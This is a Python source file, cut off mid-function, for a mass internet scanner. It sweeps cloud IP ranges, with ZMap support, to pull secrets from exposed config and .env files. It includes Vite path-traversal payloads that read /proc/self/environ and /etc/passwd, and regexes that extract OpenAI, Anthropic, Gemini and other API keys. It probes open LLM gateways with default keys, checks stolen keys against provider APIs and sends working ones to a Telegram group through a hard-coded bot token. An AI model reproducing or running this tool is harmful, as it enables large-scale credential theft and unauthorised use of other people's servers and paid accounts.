#!/usr/bin/env python3
r'''
INFINITE LLM GATEWAY + KEY SCANNER
==================================
Long-running scanner for VM deployment.
Features:
  1. IP Generator - builds target list from port_4000.json + random IP generation
  2. Niansuh Config Scanner - port 3000 config file key extraction
  3. LLM Gateway Tester - tests LiteLLM (sk-1234), Ollama, vLLM, etc.
  4. API Key Validator - verifies extracted keys against real provider APIs
  5. Telegram Reporter - sends ONLY working keys to group

Telegram:
  Bot:   8698804293:AAGO2c3O7tIqNmGS5Nkkc2RB2-0EVBoLfEs
  Group: -1003732431449

Usage:
  python infinite_scanner.py                    # Full infinite run
  python infinite_scanner.py --test            # Test mode (small sample)
  python infinite_scanner.py --niansuh-only     # Only scan config files
  python infinite_scanner.py --gate-only        # Only test LLM gateways
'''

import asyncio
import aiohttp
import json
import os
import re
import sys
import time
import random
import argparse
import ipaddress
from datetime import datetime
from pathlib import Path
from collections import defaultdict, Counter

# ═══════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════

BASE_DIR = Path(__file__).parent.resolve()
OUTPUT_DIR = BASE_DIR / 'scan_output'
OUTPUT_DIR.mkdir(exist_ok=True)

STATE_FILE = OUTPUT_DIR / 'scan_state.json'
SEEN_KEYS_FILE = OUTPUT_DIR / 'seen_keys.json'
SEEN_IPS_FILE = OUTPUT_DIR / 'seen_ips.json'
FOUND_KEYS_FILE = OUTPUT_DIR / 'found_working_keys.json'
FOUND_GATES_FILE = OUTPUT_DIR / 'found_working_gates.json'
SCAN_LOG = OUTPUT_DIR / 'scan_log.jsonl'

# Telegram config
TELEGRAM_BOT_TOKEN = '8698804293:AAGO2c3O7tIqNmGS5Nkkc2RB2-0EVBoLfEs'
TELEGRAM_CHAT_ID = '-1003732431449'

# Concurrency
SCAN_CONCURRENT = 150
AUTH_CONCURRENT = 100
CHAT_CONCURRENT = 60

# Timeouts
SCAN_TIMEOUT = aiohttp.ClientTimeout(total=8, connect=3)
AUTH_TIMEOUT = aiohttp.ClientTimeout(total=8, connect=3)
CHAT_TIMEOUT = aiohttp.ClientTimeout(total=25, connect=5)
KEY_VALIDATE_TIMEOUT = aiohttp.ClientTimeout(total=30, connect=5)

# Cycle sleep (seconds between IP batch scans)
CYCLE_SLEEP = 60

# Batch sizes
IPS_PER_BATCH = 3000
NIANSUH_PATHS_PER_TARGET = 18

# ═══════════════════════════════════════════════════════════════
# TELEGRAM
# ═══════════════════════════════════════════════════════════════

async def send_telegram(message: str, bot_token: str = TELEGRAM_BOT_TOKEN,
                       chat_id: str = TELEGRAM_CHAT_ID) -> bool:
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    payload = {'chat_id': chat_id, 'text': message, 'parse_mode': 'HTML'}
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                return resp.status == 200
    except Exception as e:
        print(f'  [TG ERROR] {e}')
        return False


def format_key_message(provider: str, key_value: str, source_url: str,
                       models: list, key_type: str = 'api_key') -> str:
    '''Format a key find message exactly like Niansuh's format.'''
    model_list = '\n'.join(f'{m}' for m in models[:20])
    extra = f'... +{len(models)-20} more' if len(models) > 20 else ''
    return f'''🔑 KEY FOUND — {provider}
━━━━━━━━━━━━━━━━━━━━━━
🏷 Provider: {provider}
🔐 Key: {key_value}
🌐 Source: {source_url}
🤖 Models ({len(models)}):
{model_list}{extra}
━━━━━━━━━━━━━━━━━━━━━━'''


def format_gate_message(ip: str, port: int, framework: str, working_key: str,
                       models: list, source: str = '') -> str:
    model_list = '\n'.join(f'{m}' for m in models[:20])
    extra = f'... +{len(models)-20} more' if len(models) > 20 else ''
    key_display = working_key if working_key else '(no-auth)'
    return f'''🅰️ LLM GATE FOUND — {framework}
━━━━━━━━━━━━━━━━━━━━━━
🌐 Endpoint: http://{ip}:{port}
🔑 Key: {key_display}
🏷 Framework: {framework}
🤖 Models ({len(models)}):
{model_list}{extra}
━━━━━━━━━━━━━━━━━━━━━━'''


# ═══════════════════════════════════════════════════════════════
# IP GENERATOR
# ═══════════════════════════════════════════════════════════════

# Cloud provider IP ranges for targeted scanning
CLOUD_RANGES = [
    # AWS
    ('3.0.0.0', '3.255.255.255'),
    ('18.0.0.0', '18.255.255.255'),
    ('52.0.0.0', '52.255.255.255'),
    ('54.0.0.0', '54.255.255.255'),
    ('35.0.0.0', '35.255.255.255'),
    ('44.0.0.0', '44.255.255.255'),
    ('52.0.0.0', '52.255.255.255'),
    ('54.0.0.0', '54.255.255.255'),
    # Azure
    ('13.64.0.0', '13.255.255.255'),
    ('20.0.0.0', '20.255.255.255'),
    ('40.0.0.0', '40.127.255.255'),
    ('52.0.0.0', '52.255.255.255'),
    ('104.0.0.0', '104.255.255.255'),
    ('108.0.0.0', '108.255.255.255'),
    # Google Cloud
    ('34.0.0.0', '34.255.255.255'),
    ('35.0.0.0', '35.255.255.255'),
    ('104.0.0.0', '104.255.255.255'),
    ('142.0.0.0', '142.255.255.255'),
    # DigitalOcean
    ('64.0.0.0', '64.255.255.255'),
    ('128.0.0.0', '128.255.255.255'),
    ('138.0.0.0', '138.255.255.255'),
    ('159.0.0.0', '159.255.255.255'),
    ('165.0.0.0', '165.255.255.255'),
    ('167.0.0.0', '167.255.255.255'),
    ('170.0.0.0', '170.255.255.255'),
    ('188.0.0.0', '188.255.255.255'),
    ('192.0.0.0', '192.255.255.255'),
    ('193.0.0.0', '193.255.255.255'),
    ('194.0.0.0', '194.255.255.255'),
    ('195.0.0.0', '195.255.255.255'),
    # Hetzner
    ('5.0.0.0', '5.255.255.255'),
    ('6.0.0.0', '6.255.255.255'),
    ('7.0.0.0', '7.255.255.255'),
    ('9.0.0.0', '9.255.255.255'),
    ('10.0.0.0', '10.255.255.255'),
    # OVH
    ('51.0.0.0', '51.255.255.255'),
    ('57.0.0.0', '57.255.255.255'),
    ('87.0.0.0', '87.255.255.255'),
    ('91.0.0.0', '91.255.255.255'),
    ('92.0.0.0', '92.255.255.255'),
    ('93.0.0.0', '93.255.255.255'),
    ('94.0.0.0', '94.255.255.255'),
    ('95.0.0.0', '95.255.255.255'),
    ('141.0.0.0', '141.255.255.255'),
    ('147.0.0.0', '147.255.255.255'),
    # Other popular
    ('45.0.0.0', '45.255.255.255'),
    ('46.0.0.0', '46.255.255.255'),
    ('47.0.0.0', '47.255.255.255'),
    ('62.0.0.0', '62.255.255.255'),
    ('65.0.0.0', '65.255.255.255'),
    ('66.0.0.0', '66.255.255.255'),
    ('72.0.0.0', '72.255.255.255'),
    ('74.0.0.0', '74.255.255.255'),
    ('75.0.0.0', '75.255.255.255'),
    ('76.0.0.0', '76.255.255.255'),
    ('77.0.0.0', '77.255.255.255'),
    ('78.0.0.0', '78.255.255.255'),
    ('79.0.0.0', '79.255.255.255'),
    ('80.0.0.0', '80.255.255.255'),
    ('81.0.0.0', '81.255.255.255'),
    ('82.0.0.0', '82.255.255.255'),
    ('83.0.0.0', '83.255.255.255'),
    ('84.0.0.0', '84.255.255.255'),
    ('85.0.0.0', '85.255.255.255'),
    ('86.0.0.0', '86.255.255.255'),
    ('89.0.0.0', '89.255.255.255'),
    ('103.0.0.0', '103.255.255.255'),
    ('107.0.0.0', '107.255.255.255'),
    ('113.0.0.0', '113.255.255.255'),
    ('114.0.0.0', '114.255.255.255'),
    ('115.0.0.0', '115.255.255.255'),
    ('116.0.0.0', '116.255.255.255'),
    ('120.0.0.0', '120.255.255.255'),
    ('121.0.0.0', '121.255.255.255'),
    ('122.0.0.0', '122.255.255.255'),
    ('123.0.0.0', '123.255.255.255'),
    ('129.0.0.0', '129.255.255.255'),
    ('130.0.0.0', '130.255.255.255'),
    ('132.0.0.0', '132.255.255.255'),
    ('134.0.0.0', '134.255.255.255'),
    ('136.0.0.0', '136.255.255.255'),
    ('144.0.0.0', '144.255.255.255'),
    ('152.0.0.0', '152.255.255.255'),
    ('157.0.0.0', '157.255.255.255'),
    ('158.0.0.0', '158.255.255.255'),
    ('160.0.0.0', '160.255.255.255'),
    ('161.0.0.0', '161.255.255.255'),
    ('164.0.0.0', '164.255.255.255'),
    ('169.0.0.0', '169.255.255.255'),
    ('170.0.0.0', '170.255.255.255'),
    ('171.0.0.0', '171.255.255.255'),
    ('172.0.0.0', '172.31.255.255'),
    ('176.0.0.0', '176.255.255.255'),
    ('178.0.0.0', '178.255.255.255'),
    ('179.0.0.0', '179.255.255.255'),
    ('180.0.0.0', '180.255.255.255'),
    ('181.0.0.0', '181.255.255.255'),
    ('182.0.0.0', '182.255.255.255'),
    ('183.0.0.0', '183.255.255.255'),
    ('185.0.0.0', '185.255.255.255'),
    ('188.0.0.0', '188.255.255.255'),
    ('193.0.0.0', '193.255.255.255'),
    ('194.0.0.0', '194.255.255.255'),
    ('195.0.0.0', '195.255.255.255'),
    ('196.0.0.0', '196.255.255.255'),
    ('197.0.0.0', '197.255.255.255'),
    ('198.0.0.0', '198.255.255.255'),
    ('199.0.0.0', '199.255.255.255'),
    ('200.0.0.0', '200.255.255.255'),
    ('201.0.0.0', '201.255.255.255'),
    ('202.0.0.0', '202.255.255.255'),
    ('203.0.0.0', '203.255.255.255'),
    ('204.0.0.0', '204.255.255.255'),
    ('205.0.0.0', '205.255.255.255'),
    ('206.0.0.0', '206.255.255.255'),
    ('207.0.0.0', '207.255.255.255'),
    ('208.0.0.0', '208.255.255.255'),
    ('209.0.0.0', '209.255.255.255'),
    ('211.0.0.0', '211.255.255.255'),
    ('212.0.0.0', '212.255.255.255'),
    ('213.0.0.0', '213.255.255.255'),
    ('214.0.0.0', '214.255.255.255'),
    ('215.0.0.0', '215.255.255.255'),
    ('216.0.0.0', '216.255.255.255'),
    ('217.0.0.0', '217.255.255.255'),
    ('218.0.0.0', '218.255.255.255'),
    ('219.0.0.0', '219.255.255.255'),
    ('220.0.0.0', '220.255.255.255'),
    ('221.0.0.0', '221.255.255.255'),
    ('222.0.0.0', '222.255.255.255'),
    ('223.0.0.0', '223.255.255.255'),
]

# Common /24 blocks for port 3000 (dev servers, web frameworks)
DEV_SERVER_SUBNETS = [
    # Web dev ranges
    '3.0.0.0/8', '18.0.0.0/8', '52.0.0.0/8', '54.0.0.0/8',
    '35.0.0.0/8', '13.0.0.0/8', '20.0.0.0/8', '40.0.0.0/8',
    '104.0.0.0/8', '34.0.0.0/8', '142.0.0.0/8',
    '64.0.0.0/8', '128.0.0.0/8', '138.0.0.0/8', '159.0.0.0/8',
    '165.0.0.0/8', '167.0.0.0/8', '170.0.0.0/8',
    '5.0.0.0/8', '6.0.0.0/8', '7.0.0.0/8', '9.0.0.0/8',
    '51.0.0.0/8', '57.0.0.0/8', '87.0.0.0/8', '91.0.0.0/8',
    '92.0.0.0/8', '93.0.0.0/8', '94.0.0.0/8', '95.0.0.0/8',
    '141.0.0.0/8', '147.0.0.0/8',
    '45.0.0.0/8', '46.0.0.0/8', '47.0.0.0/8',
    '62.0.0.0/8', '65.0.0.0/8', '66.0.0.0/8',
    '72.0.0.0/8', '74.0.0.0/8', '75.0.0.0/8', '76.0.0.0/8',
    '77.0.0.0/8', '78.0.0.0/8', '79.0.0.0/8', '80.0.0.0/8',
    '81.0.0.0/8', '82.0.0.0/8', '83.0.0.0/8', '84.0.0.0/8',
    '85.0.0.0/8', '86.0.0.0/8', '89.0.0.0/8',
    '103.0.0.0/8', '107.0.0.0/8', '113.0.0.0/8',
    '114.0.0.0/8', '115.0.0.0/8', '116.0.0.0/8',
    '120.0.0.0/8', '121.0.0.0/8', '122.0.0.0/8', '123.0.0.0/8',
    '129.0.0.0/8', '130.0.0.0/8', '132.0.0.0/8', '134.0.0.0/8',
    '136.0.0.0/8', '144.0.0.0/8', '152.0.0.0/8',
    '157.0.0.0/8', '158.0.0.0/8', '160.0.0.0/8', '161.0.0.0/8',
    '164.0.0.0/8', '169.0.0.0/8', '171.0.0.0/8',
    '176.0.0.0/8', '178.0.0.0/8', '179.0.0.0/8',
    '180.0.0.0/8', '181.0.0.0/8', '182.0.0.0/8', '183.0.0.0/8',
    '185.0.0.0/8', '188.0.0.0/8', '193.0.0.0/8', '194.0.0.0/8',
    '195.0.0.0/8', '196.0.0.0/8', '197.0.0.0/8',
    '198.0.0.0/8', '199.0.0.0/8', '200.0.0.0/8', '201.0.0.0/8',
    '202.0.0.0/8', '203.0.0.0/8', '204.0.0.0/8', '205.0.0.0/8',
    '206.0.0.0/8', '207.0.0.0/8', '208.0.0.0/8', '209.0.0.0/8',
    '211.0.0.0/8', '212.0.0.0/8', '213.0.0.0/8', '214.0.0.0/8',
    '215.0.0.0/8', '216.0.0.0/8', '217.0.0.0/8', '218.0.0.0/8',
    '219.0.0.0/8', '220.0.0.0/8', '221.0.0.0/8', '222.0.0.0/8',
    '223.0.0.0/8',
]

# ═══════════════════════════════════════════════════════════════
# ZMAP INTEGRATION
# ═══════════════════════════════════════════════════════════════

import subprocess

ZMAP_CACHE_DIR = OUTPUT_DIR / 'zmap_cache'
ZMAP_CACHE_DIR.mkdir(exist_ok=True)

def is_zmap_available() -> bool:
    """Check if ZMap is installed and accessible."""
    try:
        result = subprocess.run(['zmap', '--version'], 
                             capture_output=True, text=True, timeout=5)
        return result.returncode == 0
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False


def run_zmap_scan(port: int, 
                  output_file: str = None,
                  bandwidth: str = '10M',
                  probe_rate: int = 1000,
                  max_probes: int = None,
                  blacklist_file: str = None,
                  timeout: int = 300) -> list:
    """
    Run ZMap port scan and return list of IPs with open port.
    
    Args:
        port: Port to scan (e.g., 3000, 4000, 8000)
        output_file: Optional file to save raw ZMap output
        bandwidth: Rate limit (e.g., '10M', '50M', '100M')
        probe_rate: Packets per second (default 1000)
        max_probes: Maximum probes to send (None = unlimited)
        blacklist_file: Path to blacklist file (IPs/ranges to skip)
        timeout: Max seconds to wait for scan
    
    Returns:
        List of IPs with open port
    """
    if not is_zmap_available():
        print(f'  [ZMAP] ZMap not found - skipping port {port}')
        return []
    
    # Generate output file path if not provided
    if output_file is None:
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        output_file = str(ZMAP_CACHE_DIR / f'zmap_port{port}_{ts}.txt')
    
    # Build ZMap command
    cmd = [
        'zmap',
        '-p', str(port),
        '-o', output_file,
        '-B', bandwidth,
        '-r', str(probe_rate),
        '-q',  # Quiet mode
    ]
    
    # Add max probes if specified
    if max_probes:
        cmd.extend(['-n', str(max_probes)])
    
    # Add blacklist if specified
    if blacklist_file and os.path.exists(blacklist_file):
        cmd.extend(['--blacklist-file', blacklist_file])
    
    print(f'  [ZMAP] Scanning port {port} at {bandwidth} bandwidth...')
    print(f'  [ZMAP] Command: {" ".join(cmd)}')
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        if result.returncode != 0:
            print(f'  [ZMAP] Scan failed: {result.stderr}')
            return []
        
        # Parse output file (one IP per line)
        ips = []
        if os.path.exists(output_file):
            with open(output_file) as f:
                for line in f:
                    ip = line.strip()
                    if ip and not ip.startswith('#'):
                        ips.append(ip)
        
        print(f'  [ZMAP] Found {len(ips)} IPs with port {port} open')
        return ips
        
    except subprocess.TimeoutExpired:
        print(f'  [ZMAP] Scan timed out after {timeout}s')
        return []
    except Exception as e:
        print(f'  [ZMAP] Error: {e}')
        return []


def scan_ports_with_zmap(ports: list = None,
                         batch_size: int = 10000,
                         bandwidth: str = '5M') -> dict:
    """
    Scan multiple ports using ZMap and return IPs grouped by port.
    
    Args:
        ports: List of ports to scan (default: [3000, 4000, 8000])
        batch_size: Max IPs to collect per port
        bandwidth: ZMap bandwidth limit
    
    Returns:
        Dict mapping port -> list of IPs
    """
    if ports is None:
        ports = [3000, 4000, 8000]
    
    if not is_zmap_available():
        print(f'  [ZMAP] ZMap not installed - install from: https://github.com/zmap/zmap')
        return {port: [] for port in ports}
    
    results = {}
    for port in ports:
        print(f'\n  [ZMAP] === Scanning port {port} ===')
        ips = run_zmap_scan(
            port=port,
            bandwidth=bandwidth,
            probe_rate=ZMAP_RATE,
            timeout=600  # 10 min timeout per port
        )
        # Limit to batch_size
        results[port] = ips[:batch_size]
        print(f'  [ZMAP] Collected {len(results[port])}/{len(ips)} IPs for port {port}')
    
    return results


def load_zmap_results_from_file(port: int) -> list:
    """Load cached ZMap results for a port from previous scans."""
    cache_dir = ZMAP_CACHE_DIR
    if not cache_dir.exists():
        return []
    
    all_ips = []
    for f in cache_dir.glob(f'zmap_port{port}_*.txt'):
        try:
            with open(f) as fp:
                for line in fp:
                    ip = line.strip()
                    if ip and not ip.startswith('#'):
                        all_ips.append(ip)
        except:
            pass
    
    return list(set(all_ips))


def zmap_to_targets(zmap_results: dict) -> list:
    """
    Convert ZMap results to target format used by scanner.
    
    Args:
        zmap_results: Dict mapping port -> list of IPs
    
    Returns:
        List of target dicts with ip, port, source
    """
    targets = []
    seen = load_seen_ips()
    
    for port, ips in zmap_results.items():
        for ip in ips:
            key = f'{ip}:{port}'
            if key not in seen:
                targets.append({
                    'ip': ip,
                    'port': port,
                    'source': 'zmap',
                    'subnet': f'{ip.rsplit(".", 1)[0]}.0/24',
                })
                seen.add(key)
    
    save_seen_ips(seen)
    return targets


# /24 blocks to scan (subnets within larger ranges)
def generate_ip_batch(count: int = 3000) -> list:
    '''Generate random IPs for port 3000 scanning.'''
    targets = []
    seen = load_seen_ips()
    count_per_subnet = max(50, count // len(DEV_SERVER_SUBNETS))

    for subnet in DEV_SERVER_SUBNETS:
        try:
            net = ipaddress.ip_network(subnet, strict=False)
            # Get 256 IPs from random positions in this /24
            all_hosts = list(net.hosts())
            if len(all_hosts) >= count_per_subnet:
                random.shuffle(all_hosts)
                batch = all_hosts[:count_per_subnet]
            else:
                batch = all_hosts
            for ip in batch:
                ip_str = str(ip)
                key = f'{ip_str}:3000'
                if key not in seen:
                    targets.append({
                        'ip': ip_str,
                        'port': 3000,
                        'source': 'generated',
                        'subnet': subnet,
                    })
                    seen.add(key)
        except Exception:
            pass
        if len(targets) >= count:
            break

    save_seen_ips(seen)
    return targets[:count]


# ═══════════════════════════════════════════════════════════════
# STATE MANAGEMENT
# ═══════════════════════════════════════════════════════════════

def load_seen_ips() -> set:
    if Path(SEEN_IPS_FILE).exists():
        try:
            return set(json.load(open(SEEN_IPS_FILE)))
        except:
            return set()
    return set()


def save_seen_ips(seen: set):
    json.dump(list(seen), open(SEEN_IPS_FILE, 'w'))


def load_seen_keys() -> set:
    if Path(SEEN_KEYS_FILE).exists():
        try:
            return set(json.load(open(SEEN_KEYS_FILE)))
        except:
            return set()
    return set()


def save_seen_keys(seen: set):
    json.dump(list(seen), open(SEEN_KEYS_FILE, 'w'))


def load_found_keys() -> list:
    if Path(FOUND_KEYS_FILE).exists():
        try:
            return json.load(open(FOUND_KEYS_FILE))
        except:
            return []
    return []


def save_found_key(entry: dict):
    keys = load_found_keys()
    keys.append(entry)
    json.dump(keys, open(FOUND_KEYS_FILE, 'w'), indent=2)


def load_found_gates() -> list:
    if Path(FOUND_GATES_FILE).exists():
        try:
            return json.load(open(FOUND_GATES_FILE))
        except:
            return []
    return []


def save_found_gate(entry: dict):
    gates = load_found_gates()
    gates.append(entry)
    json.dump(gates, open(FOUND_GATES_FILE, 'w'), indent=2)


def append_log(entry: dict):
    with open(SCAN_LOG, 'a') as f:
        f.write(json.dumps(entry, default=str) + '\n')


# ═══════════════════════════════════════════════════════════════
# NIANSUH CONFIG FILE PATHS
# ═══════════════════════════════════════════════════════════════

NIANSUH_PATHS = [
    '/.env',
    '/.env.local',
    '/.env.production',
    '/.env.development',
    '/server.js',
    '/config.js',
    '/app.config.js',
    '/next.config.js',
    '/api/config',
    '/api/settings',
    '/ecosystem.config.js',
    '/package.json',
    '/@fs/..%2f..%2f..%2f..%2f..%2fproc/self/environ?raw??',
    '/@fs/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd?raw??',
    '/src/config.js',
    '/src/server.js',
    '/lib/config.js',
    '/lib/server.js',
    '/config.json',
    '/settings.json',
    '/app.js',
    '/data/config.json',
    '/api/v1/config',
    '/api/v1/settings',
    '/config/env.js',
    '/.npmrc',
    '/.yarnrc',
    '/tsconfig.json',
    '/vite.config.ts',
    '/vite.config.js',
    '/webpack.config.js',
]


# ═══════════════════════════════════════════════════════════════
# KEY EXTRACTION REGEX
# ═══════════════════════════════════════════════════════════════

KEY_PATTERNS = [
    (r'sk-or-v1-[a-zA-Z0-9]{64}', 'OpenRouter'),
    (r'sk-ant-api03-[a-zA-Z0-9_\\-]{95,}', 'Anthropic'),
    (r'sk-proj-[a-zA-Z0-9_\\-]{80,}', 'OpenAI'),
    (r'sk-svcacct-[a-zA-Z0-9_\\-]{80,}', 'OpenAI'),
    (r'sk-[a-f0-9]{32}', 'DeepSeek'),
    (r'sk-[a-zA-Z0-9]{48,}', 'OpenAI_Legacy'),
    (r'sk-[a-zA-Z0-9]{20,47}', 'Generic_OpenAI'),
    (r'AIzaSy[a-zA-Z0-9_\"]{33}', 'Gemini'),
    (r'hf_[a-zA-Z0-9]{34}', 'HuggingFace'),
    (r'xai-[a-zA-Z0-9]{20,}', 'xAI'),
    (r'gsk_[a-zA-Z0-9]{20,}', 'Groq'),
    (r'OPENAI_API_KEY[=:]\\s*([a-zA-Z0-9_\"]{20,})', 'OpenAI_env'),
    (r'ANTHROPIC_API_KEY[=:]\\s*([a-zA-Z0-9_\"]{20,})', 'Anthropic_env'),
    (r'GEMINI_API_KEY[=:]\\s*([a-zA-Z0-9_\"]{20,})', 'Gemini_env'),
    (r'DEEPSEEK_API_KEY[=:]\\s*([a-zA-Z0-9_\"]{20,})', 'DeepSeek_env'),
    (r'LITELLM_MASTER_KEY[=:]\\s*([a-zA-Z0-9_\"]{8,})', 'LiteLLM'),
    (r'api[_-]?key[=:]\\s*([a-zA-Z0-9_\"]{20,})', 'Generic_API'),
]

FAKE_KEYS = {
    'sk-1234', 'sk-1234567890', 'sk-', 'sk-your', 'sk-xxx',
    'sk-key', 'sk-test', 'sk-demo', 'sk-example',
}


def is_fake_key(k: str) -> bool:
    if not k or len(k) < 8:
        return True
    k_lower = k.lower().strip()
    for fake in FAKE_KEYS:
        if k_lower == fake or k_lower.startswith(fake):
            return True
    return False


def extract_keys(text: str) -> list:
    found = []
    seen = set()
    for pattern, key_type in KEY_PATTERNS:
        for m in re.finditer(pattern, text, re.IGNORECASE):
            val = m.group(1) if m.lastindex else m.group(0)
            val = val.strip().strip('"').strip("'")
            if is_fake_key(val) or val in seen:
                continue
            seen.add(val)
            found.append({'type': key_type, 'value': val, 'source': m.group(0)[:80]})
    return found


# ═══════════════════════════════════════════════════════════════
# LLM GATEWAY CONFIGS
# ═══════════════════════════════════════════════════════════════

LITE_LLM_KEYS = ['', 'sk-1234', 'sk-1234567890', 'sk-111111111111111111111111111111111111111111111111']
OLLAMA_KEYS = ['', 'ollama', 'sk-ollama']
VLLM_KEYS = ['', 'EMPTY']
LOCALAI_KEYS = ['', 'localai', 'sk-localai']

GATE_CONFIGS = {
    'LiteLLM': {
        'ports': [4000, 4001, 8000],
        'models_path': '/v1/models',
        'chat_path': '/v1/chat/completions',
        'keys': LITE_LLM_KEYS,
        'model_field': 'data[].id',
    },
    'Ollama': {
        'ports': [11434, 3000],
        'models_path': '/api/tags',
        'chat_path': '/api/generate',
        'alt_chat_path': '/v1/chat/completions',
        'keys': OLLAMA_KEYS,
        'model_field': 'models[].name',
    },
    'vLLM': {
        'ports': [8000, 8001, 8080],
        'models_path': '/v1/models',
        'chat_path': '/v1/chat/completions',
        'keys': VLLM_KEYS,
        'model_field': 'data[].id',
    },
    'LocalAI': {
        'ports': [8080, 9000, 8000],
        'models_path': '/v1/models',
        'chat_path': '/v1/chat/completions',
        'keys': LOCALAI_KEYS,
        'model_field': 'data[].id',
    },
    'OpenWebUI': {
        'ports': [3000, 8080],
        'models_path': '/api/models',
        'chat_path': '/api/chat/completions',
        'keys': [''],
        'model_field': 'data[].id',
    },
    'Generic': {
        'ports': [3000, 4000, 8000, 8080, 9000, 11434, 80],
        'models_path': '/v1/models',
        'chat_path': '/v1/chat/completions',
        'keys': LITE_LLM_KEYS,
        'model_field': 'data[].id',
    },
}


def parse_models(data, field_path):
    models = []
    if not data:
        return models
    if field_path == 'models[].name' and isinstance(data, dict):
        for item in data.get('models', []):
            if isinstance(item, dict):
                n = item.get('name') or item.get('id', '')
                if n:
                    models.append(str(n))
    elif field_path == 'data[].id':
        for item in data.get('data', []):
            if isinstance(item, dict):
                n = item.get('id') or item.get('name', '')
                if n:
                    models.append(str(n))
    if not models:
        for key in ['data', 'models', 'result']:
            arr = data.get(key, [])
            if isinstance(arr, list):
                for item in arr:
                    if isinstance(item, dict):
                        n = item.get('id') or item.get('name', '')
                        if n:
                            models.append(str(n))
    return models[:100]


# ═══════════════════════════════════════════════════════════════
# PHASE 1: SCAN PORT 3000 (NIANSUH CONFIG FILES)
# ═══════════════════════════════════════════════════════════════

async def scan_niansuh_target(session, ip, port, sem):
    '''Scan one IP on all Niansuh config paths. Returns list of found key entries.'''
    base = f'http://{ip}:{port}'
    results = []

    async with sem:
        for path in NIANSUH_PATHS:
            try:
                url = base + path
                async with session.get(url, ssl=False, timeout=SCAN_TIMEOUT) as resp:
                    if resp.status != 200:
                        continue
                    text = await resp.text(errors='replace')
                    if len(text) < 20:
                        continue
                    keys = extract_keys(text)
                    for k in keys:
                        results.append({
                            'ip': ip,
                            'port': port,
                            'source_path': path,
                            'source_url': url,
                            'key_type': k['type'],
                            'key_value': k['value'],
                            'ts': datetime.now().isoformat(),
                        })
                    if keys:
                        break  # Found on this path, move to next IP
            except Exception:
                pass

    return results


async def run_niansuh_scan(targets: list, concurrent: int = 150) -> list:
    print(f'\n[NIANSUH] Scanning {len(targets)} targets on port 3000...')
    sem = asyncio.Semaphore(concurrent)
    connector = aiohttp.TCPConnector(limit=0, ssl=False, force_close=True)
    all_keys = []
    seen_keys = load_seen_keys()
    done = 0

    async with aiohttp.ClientSession(timeout=SCAN_TIMEOUT, connector=connector) as sess:
        coros = [scan_niansuh_target(sess, t['ip'], t['port'], sem) for t in targets]
        for coro in asyncio.as_completed(coros):
            results = await coro
            all_keys.extend(results)
            done += 1
            if done % 200 == 0:
                print(f'  [{done}/{len(targets)}] keys_so_far={len(all_keys)}')

    # Filter to new keys only
    new_keys = [k for k in all_keys if k['key_value'] not in seen_keys]
    for k in new_keys:
        seen_keys.add(k['key_value'])
    save_seen_keys(seen_keys)

    print(f'  Found {len(all_keys)} total, {len(new_keys)} new')
    return new_keys


# ═══════════════════════════════════════════════════════════════
# PHASE 2: VALIDATE API KEYS
# ═══════════════════════════════════════════════════════════════

VALIDATORS = {
    'OpenAI': {
        'endpoint': 'https://api.openai.com/v1/models',
        'header': 'Authorization',
        'prefix': 'Bearer ',
    },
    'Anthropic': {
        'endpoint': 'https://api.anthropic.com/v1/models',
        'header': 'Authorization',
        'prefix': 'Bearer ',
    },
    'OpenRouter': {
        'endpoint': 'https://openrouter.ai/api/v1/models',
        'header': '',
        'prefix': '',
    },
    'Gemini': {
        'endpoint': None,  # Uses query param ?key=
        'header': '',
        'prefix': '',
    },
    'DeepSeek': {
        'endpoint': 'https://api.deepseek.com/v1/models',
        'header': 'Authorization',
        'prefix': 'Bearer ',
    },
    'HuggingFace': {
        'endpoint': 'https://huggingface.co/api/models',
        'header': 'Authorization',
        'prefix': 'Bearer ',
    },
}


async def validate_key(session, key_entry: dict, sem) -> dict:
    '''Validate an API key by hitting the provider's models endpoint.'''
    k_type = key_entry.get('key_type', '')
    k_val = key_entry.get('key_value', '')
    result = {**key_entry, 'status': 'untested', 'models': [], 'validated_at': datetime.now().isoformat()}

    # Map key type to validator
    provider = k_type.split('_')[0] if '_' in k_type else k_type
    if provider not in VALIDATORS and k_type not in VALIDATORS:
        provider = 'OpenAI'  # Default

    validator_key = k_type if k_type in VALIDATORS else provider
    if validator_key not in VALIDATORS:
        validator_key = provider if provider in VALIDATORS else 'OpenAI'
    val_config = VALIDATORS.get(validator_key, VALIDATORS['OpenAI'])

    async with sem:
        try:
            endpoint = val_config['endpoint']
            header = val_config['header']
            prefix = val_config['prefix']

            if validator_key == 'Gemini':
                # Gemini uses API key in query param
                ep = f'https://generativelanguage.googleapis.com/v1beta/models?key={k_val}'
                headers = {}
            elif validator_key == 'OpenRouter':
                # OpenRouter doesn't require auth for model list
                ep = endpoint
                headers = {}
            else:
                ep = endpoint
                headers = {'Content-Type': 'application/json'}
                if header:
                    headers[header] = f'{prefix}{k_val}'

            async with session.get(ep, headers=headers, timeout=KEY_VALIDATE_TIMEOUT) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    models = []
                    if validator_key == 'OpenAI' or validator_key == 'DeepSeek':
                        models = [m.get('id', '') for m in data.get('data', [])[:50]]
                    elif validator_key == 'Anthropic':
                        models = [m.get('id', '') for m in data.get('data', [])[:50]]
                    elif validator_key == 'Gemini':
                        models = [m.get('name', '').replace('models/', '') for m in data.get('models', [])[:50]]
                    elif validator_key == 'OpenRouter':
                        models = [m.get('id', '') for m in data.get('data', [])[:50]]
                    result['status'] = 'valid'
                    result['models'] = models
                elif resp.status == 401:
                    result['status'] = 'invalid'
                else:
                    result['status'] = f'http_{resp.status}'

        except asyncio.TimeoutError:
            result['status'] = 'timeout'
        except Exception as e:
            result['status'] = f'error_{str(e)[:30]}'

    return result


async def run_key_validation(keys: list, concurrent: int = 30) -> list:
    if not keys:
        return []
    print(f'\n[KEY_VALIDATE] Validating {len(keys)} keys...')
    sem = asyncio.Semaphore(concurrent)
    connector = aiohttp.TCPConnector(limit=0, ssl=True, enable_cleanup_closed=True)
    validated = []

    async with aiohttp.ClientSession(timeout=KEY_VALIDATE_TIMEOUT, connector=connector) as sess:
